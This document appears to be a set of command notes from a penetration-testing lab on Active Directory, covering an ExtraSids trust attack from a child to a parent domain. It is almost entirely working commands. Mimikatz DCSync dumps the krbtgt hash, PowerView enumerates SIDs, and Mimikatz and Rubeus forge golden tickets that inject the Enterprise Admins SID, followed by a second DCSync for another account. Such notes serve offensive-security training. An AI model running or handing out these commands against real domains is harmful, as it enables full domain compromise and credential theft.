## ExtraSids Attack - Mimikatz
#### Obtaining the KRBTGT Account's NT Hash using Mimikatz

```powershell-session
PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```
#### Using Get-DomainSID

```powershell-session
PS C:\htb> Get-DomainSID
```
#### Obtaining Enterprise Admins Group's SID using Get-DomainGroup

```powershell-session
PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
#### Using ls to Confirm No Access

```powershell-session
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
```
#### Creating a Golden Ticket with Mimikatz

```powershell-session
PS C:\htb> mimikatz.exe

mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```
#### Confirming a Kerberos Ticket is in Memory Using klist
```powershell-session
PS C:\htb> klist
```
#### Listing the Entire C: Drive of the Domain Controller

```powershell-session
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
```

## ExtraSids Attack - Rubeus
#### Using ls to Confirm No Access Before Running Rubeus

```powershell-session
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
```
#### Creating a Golden Ticket using Rubeus

```powershell-session
PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
#### Confirming the Ticket is in Memory Using klist
```powershell-session
PS C:\htb> klist
```
#### Performing a DCSync Attack
```powershell-session
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm

OR

lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```



